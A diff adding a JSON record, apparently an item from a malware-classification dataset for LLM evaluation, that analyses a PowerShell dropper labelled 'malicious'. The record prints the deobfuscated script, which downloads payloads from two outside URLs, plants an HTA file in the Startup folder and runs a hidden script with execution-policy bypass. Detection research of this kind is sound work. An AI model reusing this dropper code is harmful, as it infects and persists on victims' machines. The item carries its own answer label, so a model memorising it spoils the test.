@@ -1,0 +1,102 @@
+{
+  "meta": {
+    "quelldatei": "0bcf98a0bc82f88141cba86f3a583be951d9b05c9e9af2b1d454c291c15922de.ps1",
+    "sha256": "0bcf98a0bc82f88141cba86f3a583be951d9b05c9e9af2b1d454c291c15922de",
+    "groesse_bytes": 568,
+    "zeilen": 17,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "C:\\Users\\",
+      "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
+      "C:\\Users\\Public\\",
+      "https://ia801503.us.archive.org/13/items/startup_20210219/Startup.txt",
+      "Run.hta",
+      "http://ahmedadel.work/cairo/Server.txt",
+      "Microsoft.ps1",
+      "C:\\Users\\Public\\Microsoft.ps1"
+    ],
+    "string_anzahl_gesamt": 8,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "C:\\Users\\",
+      "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
+      "C:\\Users\\Public\\",
+      "https://ia801503.us.archive.org/13/items/startup_20210219/Startup.txt",
+      "Run.hta",
+      "http://ahmedadel.work/cairo/Server.txt",
+      "Microsoft.ps1",
+      "C:\\Users\\Public\\Microsoft.ps1"
+    ],
+    "string_anzahl_gesamt": 8,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "New-Object"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1,
+      "downloadfile": 2
+    },
+    "iocs": {
+      "urls": [
+        "http://ahmedadel.work/cairo/Server.txt",
+        "https://ia801503.us.archive.org/13/items/startup_20210219/Startup.txt"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:UserName",
+        "C:\\Users\\",
+        "C:\\Users\\Public\\",
+        "C:\\Users\\Public\\Microsoft.ps1"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "C:\\Users\\",
+      "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
+      "C:\\Users\\Public\\",
+      "https://ia801503.us.archive.org/13/items/startup_20210219/Startup.txt",
+      "Run.hta",
+      "http://ahmedadel.work/cairo/Server.txt",
+      "Microsoft.ps1",
+      "C:\\Users\\Public\\Microsoft.ps1"
+    ],
+    "string_anzahl_gesamt": 8,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "New-Object"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1,
+      "downloadfile": 2
+    },
+    "iocs": {
+      "urls": [
+        "http://ahmedadel.work/cairo/Server.txt",
+        "https://ia801503.us.archive.org/13/items/startup_20210219/Startup.txt"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:UserName",
+        "C:\\Users\\",
+        "C:\\Users\\Public\\",
+        "C:\\Users\\Public\\Microsoft.ps1"
+      ]
+    },
+    "deobfuskiert_auszug": "Function HBar0\r\n{\r\n$p = 'C:\\Users\\' + $env:UserName + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'\r\n$ps1 = 'C:\\Users\\Public\\'\r\n\r\n\r\nstart-sleep -s 7\r\n\r\nif((New-Object System.Net.WebClient).DownloadFile('https://ia801503.us.archive.org/13/items/startup_20210219/Startup.txt', $p + 'Run.hta')){\r\n}\r\nstart-sleep -s 7\r\nif((New-Object System.Net.WebClient).DownloadFile('http://ahmedadel.work/cairo/Server.txt' , $ps1 + 'Microsoft.ps1')){\r\n}\r\nstart-sleep -s 7\r\npowershell -windo 1 -noexit -exec bypass -file \"C:\\Users\\Public\\Microsoft.ps1\"\r\n}\r\nIEX HBar0",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Datei von URL herunterladen",
+      "Zeichenkette als Code ausfuehren"
+    ]
+  }
+}
